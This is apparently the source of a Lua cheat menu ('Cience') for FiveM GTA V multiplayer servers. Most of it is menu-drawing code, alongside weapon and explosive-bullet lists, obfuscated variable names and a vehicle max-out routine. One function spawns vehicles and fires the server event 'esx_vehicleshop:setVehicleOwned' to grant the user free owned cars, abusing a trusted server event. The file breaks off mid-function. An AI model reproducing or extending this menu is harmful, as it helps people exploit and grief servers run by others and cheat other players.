Cience = { }
FiveM = {}

Cience.debug = false

local Enabled = true

local logged = false
local pass = "jaleo"

local currentMenuX = 1
local selectedMenuX = 1
local currentMenuY = 1
local selectedMenuY = 1
local menuX = { 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.75 }
local menuY = { 0.025, 0.1, 0.2, 0.3, 0.425 }

local discordPresence = true

local SelectedPlayer
local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
local peds = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoPlane" }
local vehicleSpeed = { 1.0, 10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0, 90.0, 100.0, 110.0, 120.0, 130.0, 140.0, 150.0 }

local currentVehicle = 1
local selectedVehicle = 1

local currentVehicleSpeed = 16
local selectedVehicleSpeed = 16

local currentBone = 1
local selectedBone = 1

local currentDamage = 1
local selectedDamage = 1

local currentPed = 1
local selectedPed = 1

local currentBullet = 1
local selectedBullet = 1

local menus = { }
local keys = { up = 172, down = 173, left = 174, right = 175, select = 215, back = 194 }
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

function math.round(num, numDecimalPlaces)
    return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

function spawn_vehicle(veh,spawnx,spawny,spawnz)
    Citizen.Wait(0)
    local myPed = GetPlayerPed(-1)
    local vehicle = GetHashKey(veh)
    RequestModel(vehicle)
    while not HasModelLoaded(vehicle) do
        Wait(1)
    end
    SetVehicleModKit(vehicle, 0)
    SetVehicleLivery(vehicle, 1)
    local plate = "CTZN"..6969
    local spawned_car = CreateVehicle(vehicle, spawnx,spawny,spawnz, 440.55, -1020.77, 28.64, true, false)
    SetVehicleNumberPlateText(spawned_car, plate)
    SetVehicleOnGroundProperly(spawned_car)
    SetModelAsNoLongerNeeded(vehicle)
    Citizen.InvokeNative(0xB736A491E64A32CF, Citizen.PointerValueIntInitialized(spawned_car))
    TriggerEvent("advancedFuel:setEssence", 100, GetVehicleNumberPlateText(spawned_car), GetDisplayNameFromVehicleModel(GetEntityModel(spawned_car)))
end

function spawnObject(object,x,y,z,h)
	ESX.Game.SpawnObject(object, {
      x = x,
      y = y,
      z = z,
      h = h
    }, function(obj)

      SetEntityHeading(obj, GetEntityHeading(playerPed))
      PlaceObjectOnGroundProperly(obj)
    end)
end

local function k(l)
    local m = {}
    local n = GetGameTimer() / 200
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end

function DelVeh(veh)
    SetEntityAsMissionEntity(veh, 1, 1)
    DeleteEntity(veh)
end

local function fv()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetVehicleNumberPlateText(veh, cw)
        local cx = ESX.Game.GetVehicleProperties(veh)
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
        drawNotification('~g~~h~Echo!', false)
    else
        drawNotification('~b~~h~Ese modelo no es valido!', true)
    end
end

local function RGBRainbow(frequency)
    local result = {}
    local curtime = GetGameTimer() / 1000

    result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
    result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
    result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

    return result
end

local allWeapons = { 
"WEAPON_KNIFE",
"WEAPON_KNUCKLE",
"WEAPON_NIGHTSTICK",
"WEAPON_HAMMER",
"WEAPON_BAT",
"WEAPON_GOLFCLUB",
"WEAPON_CROWBAR",
"WEAPON_BOTTLE",
"WEAPON_DAGGER",
"WEAPON_HATCHET",
"WEAPON_MACHETE",
"WEAPON_FLASHLIGHT",
"WEAPON_SWITCHBLADE",
"WEAPON_PISTOL",
"WEAPON_PISTOL_MK2",
"WEAPON_COMBATPISTOL",
"WEAPON_APPISTOL",
"WEAPON_PISTOL50",
"WEAPON_SNSPISTOL",
"WEAPON_HEAVYPISTOL",
"WEAPON_VINTAGEPISTOL",
"WEAPON_STUNGUN",
"WEAPON_FLAREGUN",
"WEAPON_MARKSMANPISTOL",
"WEAPON_REVOLVER",
"WEAPON_MICROSMG",
"WEAPON_SMG",
"WEAPON_SMG_MK2",
"WEAPON_ASSAULTSMG",
"WEAPON_MG",
"WEAPON_COMBATMG",
"WEAPON_COMBATMG_MK2",
"WEAPON_COMBATPDW",
"WEAPON_GUSENBERG",
"WEAPON_MACHINEPISTOL",
"WEAPON_ASSAULTRIFLE",
"WEAPON_ASSAULTRIFLE_MK2",
"WEAPON_CARBINERIFLE",
"WEAPON_CARBINERIFLE_MK2",
"WEAPON_ADVANCEDRIFLE",
"WEAPON_SPECIALCARBINE",
"WEAPON_BULLPUPRIFLE",
"WEAPON_COMPACTRIFLE",
"WEAPON_PUMPSHOTGUN",
"WEAPON_SAWNOFFSHOTGUN",
"WEAPON_BULLPUPSHOTGUN",
"WEAPON_ASSAULTSHOTGUN",
"WEAPON_MUSKET",
"WEAPON_HEAVYSHOTGUN",
"WEAPON_DBSHOTGUN",
"WEAPON_SNIPERRIFLE",
"WEAPON_HEAVYSNIPER",
"WEAPON_HEAVYSNIPER_MK2",
"WEAPON_MARKSMANRIFLE",
"WEAPON_GRENADELAUNCHER",
"WEAPON_GRENADELAUNCHER_SMOKE",
"WEAPON_RPG",
"WEAPON_STINGER",
"WEAPON_FIREWORK",
"WEAPON_HOMINGLAUNCHER",
"WEAPON_GRENADE",
"WEAPON_STICKYBOMB",
"WEAPON_PROXMINE",
"WEAPON_BZGAS",
"WEAPON_SMOKEGRENADE",
"WEAPON_MOLOTOV",
"WEAPON_FIREEXTINGUISHER",
"WEAPON_PETROLCAN",
"WEAPON_SNOWBALL",
"WEAPON_FLARE",
"WEAPON_BALL",
"WEAPON_MINIGUN"
}

local function debugPrint(text)
    if Cience.debug then
        Citizen.Trace('[Cience] '..tostring(text))
    end
end


local function setMenuProperty(id, property, value)
    if id and menus[id] then
        menus[id][property] = value
        debugPrint(id..' menu property changed: { '..tostring(property)..', '..tostring(value)..' }')
    end
end


local function isMenuVisible(id)
    if id and menus[id] then
        return menus[id].visible
    else
        return false
    end
end


local function setMenuVisible(id, visible, holdCurrent)
    if id and menus[id] then
        setMenuProperty(id, 'visible', visible)

        if not holdCurrent and menus[id] then
            setMenuProperty(id, 'currentOption', 1)
        end

        if visible then
            if id ~= currentMenu and isMenuVisible(currentMenu) then
                setMenuVisible(currentMenu, false)
            end

            currentMenu = id
        end
    end
end


local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
    SetTextColour(color.r, color.g, color.b, color.a)
    SetTextFont(font)
    SetTextScale(scale, scale)

    if shadow then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end

    if menus[currentMenu] then
        if center then
            SetTextCentre(center)
        elseif alignRight then
            SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
            SetTextRightJustify(true)
        end
    end

    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(text)
    EndTextCommandDisplayText(x, y)
end


local function drawRect(x, y, width, height, color)
    DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end


local function drawTitle()
    if menus[currentMenu] then
        local x = menus[currentMenu].x + menus[currentMenu].width / 2
        local y = menus[currentMenu].y + titleHeight / 2

        if menus[currentMenu].titleBackgroundSprite then
            DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255)
        else
            drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
        end

        drawText(menus[currentMenu].title, x, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
    end
end


local function drawSubTitle()
    if menus[currentMenu] then
        local x = menus[currentMenu].x + menus[currentMenu].width / 2
        local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

        local subTitleColor = { r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 160 }

        drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
        drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)

        if optionCount > menus[currentMenu].maxOptionCount then
            drawText(tostring(menus[currentMenu].currentOption)..' / '..tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true)
        end
    end
end


local function drawButton(text, subText)
    local x = menus[currentMenu].x + menus[currentMenu].width / 2
    local multiplier = nil

    if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
        multiplier = optionCount
    elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
        multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
    end

    if multiplier then
        local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
        local backgroundColor = nil
        local textColor = nil
        local subTextColor = nil
        local shadow = false

        if menus[currentMenu].currentOption == optionCount then
            backgroundColor = menus[currentMenu].menuFocusBackgroundColor
            textColor = menus[currentMenu].menuFocusTextColor
            subTextColor = menus[currentMenu].menuFocusTextColor
        else
            backgroundColor = menus[currentMenu].menuBackgroundColor
            textColor = menus[currentMenu].menuTextColor
            subTextColor = menus[currentMenu].menuSubTextColor
            shadow = true
        end

        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)

        if subText then
            drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true)
        end
    end
end


function Cience.CreateMenu(id, title)
    -- Default settings
    menus[id] = { }
    menus[id].title = title
    menus[id].subTitle = 'INTERACTION MENU'

    menus[id].visible = false

    menus[id].previousMenu = nil

    menus[id].aboutToBeClosed = false

    menus[id].x = 0.725
    menus[id].y = 0.2
    menus[id].width = 0.225

    menus[id].currentOption = 1
    menus[id].maxOptionCount = 10

    menus[id].titleFont = 2
    menus[id].titleColor = { r = 255, g = 255, b = 255, a = 255 }
    menus[id].titleBackgroundColor = { r = 0, g = 255, b = 140, a = 160 }
    menus[id].titleBackgroundSprite = nil

    menus[id].menuTextColor = { r = 255, g = 255, b = 255, a = 255 }
    menus[id].menuSubTextColor = { r = 255, g = 255, b = 255, a = 255 }
    menus[id].menuFocusTextColor = { r = 0, g = 255, b = 140, a = 255 }
    menus[id].menuFocusBackgroundColor = { r = 60, g = 60, b = 60, a = 180 }
    menus[id].menuBackgroundColor = { r = 0, g = 0, b = 0, a = 160 }

    menus[id].subTitleBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }

    menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" } --https://pastebin.com/0neZdsZ5

    debugPrint(tostring(id)..' menu created')
end


function Cience.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        Cience.CreateMenu(id, menus[parent].title)

        if subTitle then
            setMenuProperty(id, 'subTitle', string.upper(subTitle))
        else
            setMenuProperty(id, 'subTitle', string.upper(menus[parent].subTitle))
        end

        setMenuProperty(id, 'previousMenu', parent)

        setMenuProperty(id, 'x', menus[parent].x)
        setMenuProperty(id, 'y', menus[parent].y)
        setMenuProperty(id, 'maxOptionCount', menus[parent].maxOptionCount)
        setMenuProperty(id, 'titleFont', menus[parent].titleFont)
        setMenuProperty(id, 'titleColor', menus[parent].titleColor)
        setMenuProperty(id, 'titleBackgroundColor', menus[parent].titleBackgroundColor)
        setMenuProperty(id, 'titleBackgroundSprite', menus[parent].titleBackgroundSprite)
        setMenuProperty(id, 'menuTextColor', menus[parent].menuTextColor)
        setMenuProperty(id, 'menuSubTextColor', menus[parent].menuSubTextColor)
        setMenuProperty(id, 'menuFocusTextColor', menus[parent].menuFocusTextColor)
        setMenuProperty(id, 'menuFocusBackgroundColor', menus[parent].menuFocusBackgroundColor)
        setMenuProperty(id, 'menuBackgroundColor', menus[parent].menuBackgroundColor)
        setMenuProperty(id, 'subTitleBackgroundColor', menus[parent].subTitleBackgroundColor)
    else
        debugPrint('Failed to create '..tostring(id)..' submenu: '..tostring(parent)..' parent menu doesn\'t exist')
    end
end


function Cience.CurrentMenu()
    return currentMenu
end


function Cience.OpenMenu(id)
    if id and menus[id] then
        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
        setMenuVisible(id, true)
        debugPrint(tostring(id)..' menu abierto')
    else
        debugPrint('Fallo al abrir '..tostring(id)..' menu: it doesn\'t exist')
    end
end


function Cience.IsMenuOpened(id)
    return isMenuVisible(id)
end


function Cience.IsAnyMenuOpened()
    for id, _ in pairs(menus) do
        if isMenuVisible(id) then return true end
    end

    return false
end


function Cience.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
        return menus[currentMenu].aboutToBeClosed
    else
        return false
    end
end


function Cience.CloseMenu()
    if menus[currentMenu] then
        if menus[currentMenu].aboutToBeClosed then
            menus[currentMenu].aboutToBeClosed = false
            setMenuVisible(currentMenu, false)
            debugPrint(tostring(currentMenu)..' menu closed')
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            optionCount = 0
            currentMenu = nil
            currentKey = nil
        else
            menus[currentMenu].aboutToBeClosed = true
            debugPrint(tostring(currentMenu)..' menu about to be closed')
        end
    end
end


function Cience.Button(text, subText)
    local buttonText = text
    if subText then
        buttonText = '{ '..tostring(buttonText)..', '..tostring(subText)..' }'
    end

    if menus[currentMenu] then
        optionCount = optionCount + 1

        local isCurrent = menus[currentMenu].currentOption == optionCount

        drawButton(text, subText)

        if isCurrent then
            if currentKey == keys.select then
                PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
                debugPrint(buttonText..' button pressed')
                return true
            elseif currentKey == keys.left or currentKey == keys.right then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end

        return false
    else
        debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

        return false
    end
end


function Cience.MenuButton(text, id)
    if menus[id] then
        if Cience.Button(text) then
            setMenuVisible(currentMenu, false)
            setMenuVisible(id, true, true)

            return true
        end
    else
        debugPrint('Failed to create '..tostring(text)..' menu button: '..tostring(id)..' submenu doesn\'t exist')
    end

    return false
end


function Cience.CheckBox(text, checked, callback)
    if Cience.Button(text, checked and '~w~~h~On' or "~h~~c~Off") then
        checked = not checked
        debugPrint(tostring(text)..' checkbox changed to '..tostring(checked))
        if callback then callback(checked) end

        return true
    end

    return false
end


function Cience.ComboBox(text, items, currentIndex, selectedIndex, callback)
    local itemsCount = #items
    local selectedItem = items[currentIndex]
    local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

    if itemsCount > 1 and isCurrent then
        selectedItem = '← '..tostring(selectedItem)..' →'
    end

    if Cience.Button(text, selectedItem) then
        selectedIndex = currentIndex
        callback(currentIndex, selectedIndex)
        return true
    elseif isCurrent then
        if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end
        elseif currentKey == keys.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end
        end
    else
        currentIndex = selectedIndex
    end

    callback(currentIndex, selectedIndex)
    return false
end

function Cience.Display()
    if isMenuVisible(currentMenu) then
        if menus[currentMenu].aboutToBeClosed then
            Cience.CloseMenu()
        else
            ClearAllHelpMessages()

            drawTitle()
            drawSubTitle()

            currentKey = nil

            if IsControlJustReleased(1, keys.down) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                if menus[currentMenu].currentOption < optionCount then
                    menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
                else
                    menus[currentMenu].currentOption = 1
                end
            elseif IsControlJustReleased(1, keys.up) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                if menus[currentMenu].currentOption > 1 then
                    menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
                else
                    menus[currentMenu].currentOption = optionCount
                end
            elseif IsControlJustReleased(1, keys.left) then
                currentKey = keys.left
            elseif IsControlJustReleased(1, keys.right) then
                currentKey = keys.right
            elseif IsControlJustReleased(1, keys.select) then
                currentKey = keys.select
            elseif IsControlJustReleased(1, keys.back) then
                if menus[menus[currentMenu].previousMenu] then
                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    setMenuVisible(menus[currentMenu].previousMenu, true)
                else
                    Cience.CloseMenu()
                end
            end

            optionCount = 0
        end
    end
end

function Cience.SetMenuWidth(id, width)
    setMenuProperty(id, 'width', width)
end


function Cience.SetMenuX(id, x)
    setMenuProperty(id, 'x', x)
end


function Cience.SetMenuY(id, y)
    setMenuProperty(id, 'y', y)
end


function Cience.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, 'maxOptionCount', count)
end


function Cience.SetTitle(id, title)
    setMenuProperty(id, 'title', title)
end


function Cience.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, 'titleColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a })
end


function Cience.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, 'titleBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a })
end


function Cience.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, 'titleBackgroundSprite', { dict = textureDict, name = textureName })
end


function Cience.SetSubTitle(id, text)
    setMenuProperty(id, 'subTitle', string.upper(text))
end


function Cience.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, 'menuBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
end


function Cience.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, 'menuTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a })
end

function Cience.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, 'menuSubTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a })
end

function Cience.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, 'menuFocusColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a })
end


function Cience.SetMenuButtonPressedSound(id, name, set)
    setMenuProperty(id, 'buttonPressedSound', { ['name'] = name, ['set'] = set })
end

function drawNotification(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(false, false)
end

function getPosition()
  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
  return x,y,z
end

function getCamDirection()
  local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(GetPlayerPed(-1))
  local pitch = GetGameplayCamRelativePitch()

  local x = -math.sin(heading*math.pi/180.0)
  local y = math.cos(heading*math.pi/180.0)
  local z = math.sin(pitch*math.pi/180.0)

  -- normalize
  local len = math.sqrt(x*x+y*y+z*z)
  if len ~= 0 then
    x = x/len
    y = y/len
    z = z/len
  end

  return x,y,z
end

function getEntity(player)
    local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
    return entity
end

local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(u)
    DrawText(kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl)
 end

 local function bk()
    local ab=KeyboardInput("Añade un nombre al blip","",100)
    if ab==""then 
        drawNotification("~r~Nombre del blip invalido!")
        return bk()
    else 
        local bh=KeyboardInput("Enter X pos","",100)
        local bi=KeyboardInput("Enter Y pos","",100)
        local bj=KeyboardInput("Enter Z pos","",100)
        if bh~=""and bi~=""and bj~=""then 
            local bl={{colour=75,model=84}}
            for _,bm in pairs(bl)do bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR=AddBlipForCoord(bh+0.5,bi+0.5,bj+0.5)
                SetBlipSprite(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,bm.model)SetBlipDisplay(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,4)
                SetBlipScale(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,0.9)SetBlipColour(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,bm.colour)SetBlipAsShortRange(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,true)BeginTextCommandSetBlipName("STRING")
                AddTextComponentString(ab)
                EndTextCommandSetBlipName(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR)end 
            else 
                drawNotification("~r~Coordenadas invalidas!")
            end
        end 
    end

function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end

function MaxOutPerf(veh)
